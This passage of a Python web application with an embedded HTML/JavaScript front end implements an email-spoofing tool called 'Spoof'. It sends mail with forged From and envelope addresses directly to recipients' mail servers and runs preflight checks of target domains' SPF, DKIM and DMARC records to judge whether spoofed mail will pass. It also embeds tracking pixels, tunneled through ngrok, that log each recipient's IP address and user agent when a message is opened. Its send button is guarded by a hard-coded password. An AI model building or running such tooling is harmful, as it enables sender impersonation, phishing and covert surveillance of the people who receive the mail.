  <div class="field full" id="html-field" style="margin-bottom: .8rem;">
    <textarea id="body_html" rows="3">&lt;div style="font-family:Arial;padding:20px"&gt;
  &lt;h2&gt;Hello&lt;/h2&gt;
  &lt;p&gt;This is a test email. Edit to customize.&lt;/p&gt;
&lt;/div&gt;</textarea>
  </div>

  <iframe id="preview-iframe-main" class="preview-frame" sandbox></iframe>

  <div class="file-drop" onclick="document.getElementById('file-input').click()" ondragover="event.preventDefault();this.style.borderColor='#22c55e'" ondragleave="this.style.borderColor=''" ondrop="event.preventDefault();this.style.borderColor='';handleFiles(event.dataTransfer.files)">
    Drop attachments or click to add
    <input type="file" id="file-input" multiple hidden onchange="handleFiles(this.files)">
  </div>
  <div id="file-list"></div>

  <div class="actions">
    <button class="btn btn-secondary" id="probe-btn" onclick="runPreflight()">Preflight</button>
    <button class="btn btn-primary" id="send-btn" onclick="requirePassword(sendEmail)">Send</button>
  </div>

  <div class="pw-inline" id="pw-inline">
    <input type="password" id="pw-input" placeholder="Password" onkeydown="if(event.key==='Enter')checkPassword()">
    <button onclick="checkPassword()">Go</button>
    <span class="pw-err" id="pw-err"></span>
  </div>

  <div class="section" id="sec-dns">
    <div class="section-header" onclick="toggleSection('sec-dns')">
      <span><span class="arrow">&#9654;</span> DNS &amp; Preflight</span>
      <div class="section-badges" id="dns-badges"></div>
    </div>
    <div class="section-body" id="dns-results">
      <div class="pf-placeholder">Run preflight to see DNS records</div>
    </div>
  </div>

  <div class="section" id="sec-log">
    <div class="section-header" onclick="toggleSection('sec-log')">
      <span><span class="arrow">&#9654;</span> SMTP Log</span>
      <div class="section-badges" id="log-badges"></div>
    </div>
    <div class="section-body" id="log-output">
      <div class="pf-placeholder">Send an email to see the SMTP log</div>
    </div>
  </div>

  <div class="section" id="sec-track">
    <div class="section-header" onclick="toggleSection('sec-track')">
      <span><span class="arrow">&#9654;</span> Open Tracking</span>
      <div class="section-badges" id="track-badges"></div>
    </div>
    <div class="section-body" id="tracker-content" style="font-family:inherit">
      <div class="pf-placeholder">Tracking events will appear here after send</div>
    </div>
  </div>
</div>

<!-- ── Dashboard View ── -->
<div class="page" id="view-dashboard">
  <div class="dash-stats">
    <div class="stat-card stat-sends"><div class="num" id="dash-sent">0</div><div class="label">Sent</div></div>
    <div class="stat-card stat-opens"><div class="num" id="dash-opens">0</div><div class="label">Opens</div></div>
    <div class="stat-card stat-rate"><div class="num" id="dash-rate">0%</div><div class="label">Rate</div></div>
  </div>
  <div class="dash-feed">
    <h2>Activity</h2>
    <div id="dash-events"><div class="feed-empty">No events yet — send an email to get started</div></div>
  </div>
</div>

<div class="ngrok-footer" id="ngrok-bar">
  <span id="ngrok-text">No ngrok tunnel &mdash; run <strong>ngrok http 8090</strong> for open tracking</span>
</div>

<script>
// ── View switching ──
function switchView(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  if (name === 'send') {
    document.getElementById('view-send').classList.add('active');
    document.querySelectorAll('.tab')[0].classList.add('active');
  } else {
    document.getElementById('view-dashboard').classList.add('active');
    document.querySelectorAll('.tab')[1].classList.add('active');
    loadDashboard();
  }
}
// Handle /#dashboard direct link
if (location.hash === '#dashboard') switchView('dashboard');

// ── Section toggle ──
function toggleSection(id) {
  document.getElementById(id).classList.toggle('open');
}

// ── State bar ──
const STEPS = ['step-0','step-1','step-2','step-3','step-4'];
function setState(cls, text, stepStates) {
  const bar = document.getElementById('state-bar');
  bar.className = 'state-bar ' + cls;
  document.getElementById('state-text').textContent = text;
  if (stepStates) {
    stepStates.forEach((s, i) => {
      document.getElementById(STEPS[i]).className = 'state-step ' + (s || '');
    });
  }
}
function resetState() { setState('', 'Ready to send', ['','','','','']); }

// ── Password gate (send button only) ──
let _unlocked = false;
let _pendingAction = null;
function requirePassword(action) {
  if (_unlocked) { action(); return; }
  _pendingAction = action;
  const pw = document.getElementById('pw-inline');
  pw.classList.add('show');
  document.getElementById('pw-input').focus();
}
function checkPassword() {
  const inp = document.getElementById('pw-input');
  if (inp.value === 'password') {
    _unlocked = true;
    document.getElementById('pw-inline').classList.remove('show');
    document.getElementById('pw-err').textContent = '';
    if (_pendingAction) { _pendingAction(); _pendingAction = null; }
  } else {
    document.getElementById('pw-err').textContent = 'sry not for you :)';
    inp.value = '';
  }
}

// ── Ngrok status ──
async function checkNgrok() {
  const pill = document.getElementById('ngrok-pill');
  const txt = document.getElementById('ngrok-text');
  try {
    const resp = await fetch('/status');
    const data = await resp.json();
    if (data.ngrok) {
      pill.className = 'status-pill';
      pill.textContent = 'ngrok connected';
      txt.innerHTML = 'Tracking via <a href="' + data.ngrok + '" target="_blank">' + data.ngrok + '</a>';
    } else {
      pill.className = 'status-pill off';
      pill.textContent = 'ngrok disconnected';
      txt.innerHTML = 'No ngrok tunnel &mdash; run <strong>ngrok http 8090</strong> for open tracking';
    }
  } catch(e) {
    pill.className = 'status-pill off';
    pill.textContent = 'ngrok disconnected';
  }
}
checkNgrok();
setInterval(checkNgrok, 15000);

// ── File attachments ──
let attachedFiles = [];
function handleFiles(files) { for (const f of files) attachedFiles.push(f); renderFileList(); }
function removeFile(i) { attachedFiles.splice(i,1); renderFileList(); }
function renderFileList() {
  const el = document.getElementById('file-list');
  el.innerHTML = attachedFiles.map((f,i) =>
    '<div class="file-item"><span>' + f.name + ' (' + (f.size/1024).toFixed(1) + 'K)</span><span class="remove" onclick="removeFile(' + i + ')">x</span></div>'
  ).join('');
}

// ── Preview ──
function updatePreview() {
  const iframe = document.getElementById('preview-iframe-main');
  const useHtml = document.getElementById('use_html').checked;
  const html = document.getElementById('body_html').value;
  const text = document.getElementById('body_text').value;
  if (useHtml && html.trim()) {
    iframe.srcdoc = html;
  } else if (text.trim()) {
    iframe.srcdoc = '<pre style="font-family:sans-serif;padding:16px;margin:0">' + text.replace(/</g,'&lt;') + '</pre>';
  } else {
    iframe.srcdoc = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#999;font-family:sans-serif">Compose a body to see preview</div>';
  }
}
document.getElementById('body_html').addEventListener('input', updatePreview);
document.getElementById('body_text').addEventListener('input', updatePreview);
document.getElementById('use_html').addEventListener('change', function() {
  document.getElementById('html-field').style.display = this.checked ? 'block' : 'none';
  updatePreview();
});
updatePreview();

// ── Helpers ──
function colorLog(text) {
  return text
    .replace(/^(═══.*═══)$/gm, '<span class="header">$1</span>')
    .replace(/(✅.*)/g, '<span class="success">$1</span>')
    .replace(/(✓.*)/g, '<span class="success">$1</span>')
    .replace(/(✗.*)/g, '<span class="error">$1</span>')
    .replace(/(⚠.*)/g, '<span class="warn">$1</span>')
    .replace(/(SOFTFAIL|FAIL|NONE|p=none|p=reject|p=quarantine)/g, '<span class="warn">$1</span>')
    .replace(/(DELIVERED|PASS)/g, '<span class="success">$1</span>');
}

function badge(type, text) {
  return '<span class="pf-badge ' + type + '">' + text + '</span>';
}

function probeStepHtml(label, status, statusText) {
  var cls = status === 'ok' ? 'ok' : status === 'fail' ? 'fail' : status === 'warn' ? 'warn' : 'pending';
  return '<div class="probe-step ' + cls + '"><span class="label">' + label + '</span><span class="status">' + statusText + '</span></div>';
}

// ── Preflight ──
let _lastPreflight = null;
async function runPreflight() {
  const btn = document.getElementById('probe-btn');
  btn.className = 'btn btn-secondary sending'; btn.textContent = 'Checking...';

  setState('working', 'Running preflight...', ['done','active','','','']);
  toggleSection('sec-dns');
  document.getElementById('sec-dns').classList.add('open');

  const container = document.getElementById('dns-results');
  container.innerHTML = '<div class="pf-placeholder" style="color:#1d4ed8">Querying DNS records...</div>';

  const params = new URLSearchParams({
    from_addr: document.getElementById('from_addr').value,
    to_addr: document.getElementById('to_addr').value,
    envelope_from: document.getElementById('envelope_from').value,
  });

  try {
    const resp = await fetch('/preflight?' + params.toString());
    const d = await resp.json();
    _lastPreflight = d;

    const pred = d.probe.prediction;

    if (pred === 'PORT_BLOCKED' || pred === 'ERROR' || pred === 'CANNOT_RESOLVE') {
      setState('failed', 'Preflight failed: ' + pred, ['done','fail','','','']);
    } else {
      setState('ready', 'Preflight complete', ['done','done','','','']);
    }

    // Badges
    var badges = '';
    if (d.spf.verdict === 'SOFTFAIL') badges += '<span class="section-badge badge-warn">SPF ~all</span>';
    else if (d.spf.verdict === 'FAIL') badges += '<span class="section-badge badge-fail">SPF -all</span>';
    else if (d.spf.verdict === 'PASS') badges += '<span class="section-badge badge-ok">SPF pass</span>';
    else badges += '<span class="section-badge badge-none">SPF none</span>';

    if (d.dmarc.policy === 'none') badges += '<span class="section-badge badge-warn">DMARC p=none</span>';
    else if (d.dmarc.policy === 'quarantine') badges += '<span class="section-badge badge-warn">p=quarantine</span>';
    else if (d.dmarc.policy === 'reject') badges += '<span class="section-badge badge-ok">p=reject</span>';
    else badges += '<span class="section-badge badge-none">No DMARC</span>';

    if (d.probe.port25 === 'OPEN') badges += '<span class="section-badge badge-info">Port 25</span>';
    else badges += '<span class="section-badge badge-fail">Port blocked</span>';

    document.getElementById('dns-badges').innerHTML = badges;

    // SPF badge
    var spfBadge = badge('none', 'NONE');
    if (d.spf.verdict === 'SOFTFAIL') spfBadge = badge('warn', 'SOFTFAIL');
    else if (d.spf.verdict === 'FAIL') spfBadge = badge('fail', 'HARDFAIL');
    else if (d.spf.verdict === 'PASS') spfBadge = badge('pass', 'PASS');
    else if (d.spf.verdict === 'NEUTRAL') spfBadge = badge('info', 'NEUTRAL');
    var dkimBadge = d.dkim.found ? badge('fail', 'WILL FAIL') : badge('none', 'NO KEY');
    var dmarcBadge = badge('none', 'NONE');
    if (d.dmarc.policy === 'none') dmarcBadge = badge('fail', 'p=none');
    else if (d.dmarc.policy === 'quarantine') dmarcBadge = badge('warn', 'p=quarantine');
    else if (d.dmarc.policy === 'reject') dmarcBadge = badge('pass', 'p=reject');
    else if (d.dmarc.policy === 'missing') dmarcBadge = badge('none', 'MISSING');
    var mxBadge = d.mx.selected ? badge('info', d.mx.selected.split('.').slice(-3).join('.')) : badge('fail', 'NONE');

    // Probe steps
    var probeHtml = '';
    var pr = d.probe;
    probeHtml += probeStepHtml('Port 25', pr.port25==='OPEN'?'ok':pr.port25==='BLOCKED'?'fail':'pending', pr.port25||'—');
    probeHtml += probeStepHtml('EHLO', pr.ehlo==='OK'?'ok':'pending', pr.ehlo||'—');
    probeHtml += probeStepHtml('STARTTLS', pr.starttls==='OK'?'ok':pr.starttls==='NOT_SUPPORTED'?'warn':'pending', pr.starttls||'—');
    probeHtml += probeStepHtml('MAIL FROM', pr.mail_from==='ACCEPTED'?'ok':pr.mail_from&&pr.mail_from.startsWith('REJECTED')?'fail':'pending', pr.mail_from?pr.mail_from.replace('REJECTED_',''):'—');
    probeHtml += probeStepHtml('RCPT TO', pr.rcpt_to==='ACCEPTED'?'ok':pr.rcpt_to&&pr.rcpt_to.startsWith('REJECTED')?'fail':'pending', pr.rcpt_to?pr.rcpt_to.replace('REJECTED_',''):'—');

    container.innerHTML =
      '<div class="probe-steps">' + probeHtml + '</div>' +
      '<div class="pf-grid">' +
        '<div class="pf-card"><h3 style="color:#166534">MX (' + d.to_domain + ') ' + mxBadge + '</h3>' +
          '<p>' + (d.mx.records.map(function(r){return 'pri ' + r.priority + ': <code>' + r.host + '</code>'}).join('<br>') || 'No records found') + '</p></div>' +
        '<div class="pf-card"><h3 style="color:#166534">SPF (' + d.from_domain + ') ' + spfBadge + '</h3>' +
          '<p>' + (d.spf.record ? '<code>' + d.spf.record + '</code>' : 'No SPF record found') + '</p>' +
          (d.spf.policy ? '<p style="margin-top:.15rem">Policy: <strong>' + d.spf.policy + '</strong></p>' : '') + '</div>' +
        '<div class="pf-card"><h3 style="color:#166534">DKIM (' + d.from_domain + ') ' + dkimBadge + '</h3>' +
          '<p>' + (d.dkim.found ? 'Key at <code>' + d.dkim.record + '</code><br>No private key = FAIL' : 'No DKIM key found') + '</p></div>' +
        '<div class="pf-card"><h3 style="color:#166534">DMARC (' + d.from_domain + ') ' + dmarcBadge + '</h3>' +
          '<p>' + (d.dmarc.record ? '<code>' + d.dmarc.record + '</code>' : 'No DMARC record found') + '</p>' +
          (d.dmarc.policy === 'none' ? '<p style="margin-top:.15rem;color:#dc2626"><strong>p=none = no protection</strong></p>' : '') + '</div>' +
      '</div>' +
      '<details style="margin-top:.3rem"><summary style="font-size:.62rem;color:#9ca3af;cursor:pointer">Raw preflight log</summary>' +
        '<div class="log-output" style="margin-top:.2rem;max-height:200px;min-height:0">' + colorLog(d.log.join('\n')) + '</div></details>';
  } catch(err) {
    setState('failed', 'Preflight error: ' + err.message, ['done','fail','','','']);
    container.innerHTML = '<div class="pf-placeholder" style="color:#dc2626">Error: ' + err.message + '</div>';
  }
  btn.className = 'btn btn-secondary'; btn.textContent = 'Preflight';
}

// ── Send ──
async function sendEmail() {
  const btn = document.getElementById('send-btn');
  const logEl = document.getElementById('log-output');
  btn.className = 'btn btn-primary sending'; btn.textContent = 'Sending...';

  setState('working', 'Connecting to MX server...', ['done','done','active','','']);

  // Open log section
  document.getElementById('sec-log').classList.add('open');
  logEl.innerHTML = 'Connecting to MX server...\n';

  const fd = new FormData();
  fd.append('from_addr', document.getElementById('from_addr').value);
  fd.append('envelope_from', document.getElementById('envelope_from').value);
  fd.append('to_addr', document.getElementById('to_addr').value);
  fd.append('subject', document.getElementById('subject').value);
  fd.append('body_text', document.getElementById('body_text').value);
  fd.append('body_html', document.getElementById('use_html').checked ? document.getElementById('body_html').value : '');
  for (const f of attachedFiles) fd.append('attachments', f);

  try {
    const resp = await fetch('/send', { method: 'POST', body: fd });
    const data = await resp.json();
    logEl.innerHTML = colorLog(data.log);
    logEl.scrollTop = logEl.scrollHeight;

    if (data.success) {
      btn.className = 'btn btn-primary success'; btn.textContent = 'Delivered';
      setState('success', 'Delivered to ' + document.getElementById('to_addr').value + ' — waiting for open', ['done','done','done','done','active']);
      document.getElementById('log-badges').innerHTML = '<span class="section-badge badge-ok">Delivered</span>';
      if (data.track_id) startTrackingPolling(data.track_id);
    } else {
      setState('failed', 'Send failed — check SMTP log', ['done','done','fail','','']);
      document.getElementById('log-badges').innerHTML = '<span class="section-badge badge-fail">Failed</span>';
    }
  } catch(err) {
    logEl.innerHTML = '<span class="error">Error: ' + err.message + '</span>';
    setState('failed', 'Send error: ' + err.message, ['done','done','fail','','']);
  }
  setTimeout(function() { btn.className = 'btn btn-primary'; btn.textContent = 'Send'; }, 4000);
}

// ── Open Tracking ──
let _trackPollers = {};
function startTrackingPolling(trackId) {
  const el = document.getElementById('tracker-content');

  if (!document.getElementById('track-' + trackId)) {
    var entry = document.createElement('div');
    entry.id = 'track-' + trackId;
    entry.className = 'open-event waiting';
    entry.innerHTML =
      '<span class="dot"></span>' +
      '<span class="time">waiting...</span>' +
      '<span class="detail">' + document.getElementById('to_addr').value + ' — ' + document.getElementById('subject').value + '</span>';
    var placeholder = el.querySelector('.pf-placeholder');
    if (placeholder) placeholder.remove();
    el.prepend(entry);
  }

  if (_trackPollers[trackId]) clearInterval(_trackPollers[trackId]);
  _trackPollers[trackId] = setInterval(async function() {
    try {
      var resp = await fetch('/track-events?id=' + trackId);
      var data = await resp.json();
      var entry = document.getElementById('track-' + trackId);
      if (data.opens && data.opens.length > 0) {
        var latest = data.opens[data.opens.length - 1];
        var t = new Date(latest.time);
        var timeStr = t.toLocaleTimeString();
        entry.className = 'open-event';
        entry.innerHTML =
          '<span class="dot"></span>' +
          '<span class="time">' + timeStr + '</span>' +
          '<span class="detail">Opened ' + data.opens.length + 'x — ' + data.to + ' — ' + data.subject + '</span>';
        // Update state bar
        setState('success', 'Opened ' + data.opens.length + 'x by ' + data.to, ['done','done','done','done','done']);
        // Update tracking badges
        document.getElementById('track-badges').innerHTML = '<span class="section-badge badge-ok">' + data.opens.length + ' open' + (data.opens.length > 1 ? 's' : '') + '</span>';
        // Flash the section header
        var secTrack = document.getElementById('sec-track');
        if (!secTrack.classList.contains('open')) {
          secTrack.querySelector('.section-header').style.background = '#dcfce7';
          setTimeout(function() { secTrack.querySelector('.section-header').style.background = ''; }, 3000);
        }
      }
    } catch(e) {}
  }, 5000);
}

// ── Dashboard ──
let _dashIdx = 0;
let _dashInterval = null;
function loadDashboard() {
  if (_dashInterval) return;
  fetchDashEvents();
  _dashInterval = setInterval(fetchDashEvents, 5000);
}
async function fetchDashEvents() {
  try {
    var resp = await fetch('/dashboard/events?since=' + _dashIdx);
    var data = await resp.json();
    if (data.events && data.events.length > 0) {
      var container = document.getElementById('dash-events');
      var empty = container.querySelector('.feed-empty');
      if (empty) empty.remove();
      data.events.forEach(function(ev) {
        var div = document.createElement('div');
        div.className = 'dash-event ev-' + ev.type;
        var icon = ev.type === 'open' ? '&#128065;' : '&#9993;';
        var title = ev.type === 'open'
          ? 'Opened by ' + ev.to
          : 'Sent to ' + ev.to;
        var detail = ev.type === 'open'
          ? 'from ' + (ev.ip || '') + ' — "' + (ev.subject || '') + '"'
          : (ev.from || '') + ' — "' + (ev.subject || '') + '"';
        var t = new Date(ev.time);
        div.innerHTML =
          '<div class="ev-icon">' + icon + '</div>' +
          '<div class="ev-body"><div class="ev-title">' + title + '</div><div class="ev-detail">' + detail + '</div></div>' +
          '<div class="ev-time">' + t.toLocaleTimeString() + '</div>';
        container.prepend(div);
      });
      _dashIdx = data.total;
    }
    // Update stats
    var tResp = await fetch('/track-events');
    var tData = await tResp.json();
    var sends = Object.keys(tData).length;
    var opens = 0;
    Object.values(tData).forEach(function(v) { opens += (v.opens || []).length; });
    document.getElementById('dash-sent').textContent = sends;
    document.getElementById('dash-opens').textContent = opens;
    document.getElementById('dash-rate').textContent = sends > 0 ? Math.round(opens/sends*100) + '%' : '0%';
  } catch(e) {}
}
</script>
</body>
</html>"""


# ── Multipart form parser (replaces deprecated cgi module) ──────────
def _parse_multipart(content_type, body):
    """Parse multipart/form-data. Returns (fields_dict, attachments_list)."""
    # Extract boundary from Content-Type header
    boundary = None
    for part in content_type.split(";"):
        part = part.strip()
        if part.startswith("boundary="):
            boundary = part[len("boundary="):]
            break
    if not boundary:
        return {}, []

    fields = {}
    attachments = []
    # Split by boundary
    boundary_bytes = ("--" + boundary).encode()
    parts = body.split(boundary_bytes)

    for part in parts[1:]:  # skip preamble
        if part.startswith(b"--"):  # closing boundary
            break
        # Split headers from body at \r\n\r\n
        if b"\r\n\r\n" not in part:
            continue
        header_block, content = part.split(b"\r\n\r\n", 1)
        # Strip trailing \r\n
        if content.endswith(b"\r\n"):
            content = content[:-2]

        headers_str = header_block.decode("utf-8", errors="replace")
        # Parse Content-Disposition
        name = None
        filename = None
        for line in headers_str.split("\r\n"):
            if line.lower().startswith("content-disposition:"):
                for token in line.split(";"):
                    token = token.strip()
                    if token.startswith("name="):
                        name = token[5:].strip('"')
                    elif token.startswith("filename="):
                        filename = token[9:].strip('"')

        if not name:
            continue

        if filename:
            if filename and len(content) > 0:
                attachments.append((filename, content))
        else:
            fields[name] = content.decode("utf-8", errors="replace")

    return fields, attachments


# ── HTTP Handler ────────────────────────────────────────────────────
class SpoofHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        # ── Tracking pixel endpoint ──
        track_match = re.match(r'^/track/([a-f0-9]+)\.gif', self.path)
        if track_match:
            track_id = track_match.group(1)
            # Record the open event
            client_ip = self.client_address[0]
            user_agent = self.headers.get("User-Agent", "unknown")
            open_time = datetime.now(timezone.utc).isoformat()
            with _track_lock:
                if track_id in _track_store:
                    _track_store[track_id]["opens"].append({
                        "time": open_time,
                        "ip": client_ip,
                        "ua": user_agent
                    })
                    entry = _track_store[track_id]
                    with _event_lock:
                        _event_log.append({
                            "type": "open", "time": open_time, "track_id": track_id,
                            "from": entry["from"], "to": entry["to"],
                            "subject": entry["subject"], "ip": client_ip
                        })
                    print(f"  📬 Email opened! track_id={track_id} from {client_ip}")
                else:
                    print(f"  ⚠ Unknown track_id={track_id} from {client_ip}")
            # Serve the 1x1 transparent GIF
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.send_header("Content-Length", str(len(TRACKING_GIF)))
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.end_headers()
            self.wfile.write(TRACKING_GIF)
            return

        # ── Dashboard page (redirect to unified page with dashboard tab) ──
        if self.path == "/dashboard":
            self.send_response(302)
            self.send_header("Location", "/#dashboard")
            self.end_headers()
            return

        # ── Dashboard events API ──
        if self.path.startswith("/dashboard/events"):
            qs = self.path.split("?", 1)[1] if "?" in self.path else ""
            params = parse_qs(qs)
            since_idx = int(params.get("since", ["0"])[0])
            with _event_lock:
                events = _event_log[since_idx:]
                total = len(_event_log)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"events": events, "total": total}).encode())
            return

        # ── Status endpoint (ngrok check) ──
        if self.path == "/status":
            ngrok = get_ngrok_url()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(json.dumps({"ngrok": ngrok}).encode())
            return

        # ── Track events polling endpoint ──
        if self.path.startswith("/track-events"):
            qs = self.path.split("?", 1)[1] if "?" in self.path else ""
            params = parse_qs(qs)
            track_id = params.get("id", [""])[0]
            with _track_lock:
                if track_id and track_id in _track_store:
                    result = _track_store[track_id]
                else:
                    # Return all tracked emails
                    result = {tid: {"from": v["from"], "to": v["to"], "subject": v["subject"],
                                    "sent_at": v["sent_at"], "open_count": len(v["opens"]),
                                    "opens": v["opens"]} for tid, v in _track_store.items()}
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            return

        if self.path.startswith("/preflight"):
            # Parse query params
            qs = self.path.split("?", 1)[1] if "?" in self.path else ""
            params = parse_qs(qs)
            from_addr = params.get("from_addr", [""])[0]
            to_addr = params.get("to_addr", [""])[0]
            envelope_from = params.get("envelope_from", [from_addr])[0]

            if not from_addr or not to_addr:
                result = {"error": "from_addr and to_addr required"}
            else:
                try:
                    result = run_preflight(from_addr, to_addr, envelope_from)
                except Exception as e:
                    result = {"error": str(e), "log": [traceback.format_exc()]}

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode())

    def do_POST(self):
        if self.path != "/send":
            self.send_error(404)
            return

        content_type = self.headers.get("Content-Type", "")
        length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(length)

        if "multipart/form-data" in content_type:
            fields, attachments = _parse_multipart(content_type, raw_body)
            from_addr     = fields.get("from_addr", "")
            envelope_from = fields.get("envelope_from", "")
            to_addr       = fields.get("to_addr", "")
            subject       = fields.get("subject", "Test")
            body_text     = fields.get("body_text", "")
            body_html     = fields.get("body_html", "")
        else:
            params = parse_qs(raw_body.decode())
            from_addr     = params.get("from_addr", [""])[0]
            envelope_from = params.get("envelope_from", [""])[0]
            to_addr       = params.get("to_addr", [""])[0]
            subject       = params.get("subject", [""])[0]
            body_text     = params.get("body_text", [""])[0]
            body_html     = params.get("body_html", [""])[0]
            attachments   = []

        # Get the host the client used to reach us (for tracking pixel URL)
        server_host = self.headers.get("Host", f"localhost:{PORT}").split(":")[0]

        if not to_addr:
            result = {"success": False, "log": "Error: No recipient."}
        else:
            try:
                result = send_spoofed_email(
                    from_addr, to_addr, envelope_from,
                    subject, body_text, body_html, attachments, server_host
                )
            except Exception as e:
                result = {"success": False, "log": f"Error:\n{traceback.format_exc()}"}

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(result).encode())


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), SpoofHandler)
    print(f"\n  Spoof running at http://localhost:{PORT}")
    print(f"  Press Ctrl+C to stop.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Stopped.")
        server.server_close()
